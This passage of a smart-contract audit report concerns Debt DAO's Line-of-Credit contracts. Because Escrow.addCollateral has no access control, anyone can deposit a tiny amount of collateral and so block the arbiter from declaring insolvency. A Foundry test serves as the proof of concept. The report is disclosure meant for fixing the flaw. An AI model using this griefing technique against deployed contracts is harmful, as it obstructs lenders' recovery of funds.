there is no access control, anyone can add collateral.

Then basically if a user keep adding a tiny amount of collateral in Escrow, the total colletral value can never be 0 and the arbiter can any declare the credit position as insolvent.

As Shown in POC.



## Proof of Concept

We modify a test case to as our POC.

https://github.com/debtdao/Line-of-Credit/blob/e8aa08b44f6132a5ed901f8daa231700c5afeb3a/contracts/tests/SecuredLine.t.sol#L436

```solidity
function test_can_delcare_insolvency_when_all_assets_liquidated() public {
	_addCredit(address(supportedToken1), 1 ether);
	bytes32 id = line.ids(0);
	hoax(borrower);

	line.borrow(id, 1 ether);
	console.log('check');

	vm.warp(ttl+1);
	//hoax(arbiter);

	vm.startPrank(arbiter);
	assertTrue(line.releaseSpigot(arbiter));
	assertTrue(line.spigot().updateOwner(address(0xf1c0)));
	assertEq(1 ether, line.liquidate(1 ether, address(supportedToken2)));
	// release spigot + liquidate

	line.declareInsolvent();
	assertEq(uint(LineLib.STATUS.INSOLVENT), uint(line.status()));
}
```

this test shows that after the arbiter liqudiate the collateral, the arbiter can declare the line of credit as insolvent.

However, if a user (anyone) keep adding a tiny tiny amount of token as collateral, the arbiter cannot declare it as insolvent, as shown in the POC below.

```solidity
function test_can_delcare_insolvency_when_all_assets_liquidated_POC() public {
	_addCredit(address(supportedToken1), 1 ether);
	bytes32 id = line.ids(0);
	hoax(borrower);

	line.borrow(id, 1 ether);
	console.log('check');

	vm.warp(ttl+1);
	//hoax(arbiter);

	vm.startPrank(arbiter);
	assertTrue(line.releaseSpigot(arbiter));
	assertTrue(line.spigot().updateOwner(address(0xf1c0)));
	assertEq(1 ether, line.liquidate(1 ether, address(supportedToken2)));
	vm.stopPrank();
	// release spigot + liquidate

	address escrow = address(line.escrow());
	uint256 value = Escrow(escrow).getCollateralValue();
	console.log("get collateral value after liquidation");
	console.log(value);

	vm.prank(lender); // or vm.prank(borrower);
	console.log("------");
	console.log("adding a tiny amount of collateral");

	Escrow(escrow).addCollateral(0.00001 ether, address(supportedToken1));
	value = Escrow(escrow).getCollateralValue();
	console.log("get collateral value after adding tiny amount of collateral");
	console.log(value);

	vm.startPrank(arbiter);
	line.declareInsolvent();
	assertEq(uint(LineLib.STATUS.INSOLVENT), uint(line.status()));
}
```

What we do is that after the escrow colletral asset is liquidated, we locate the escrow address from the line contract.

```solidity
address escrow = address(line.escrow());
```

then we add a tiny amount of collateral to inflate the collateral value to a not-zero value.

```solidity
Escrow(escrow).addCollateral(0.00001 ether, address(supportedToken1));
```

then the transaction fails when we call

```solidity
line.declareInsolvent();
assertEq(uint(LineLib.STATUS.INSOLVENT), uint(line.status()));
```

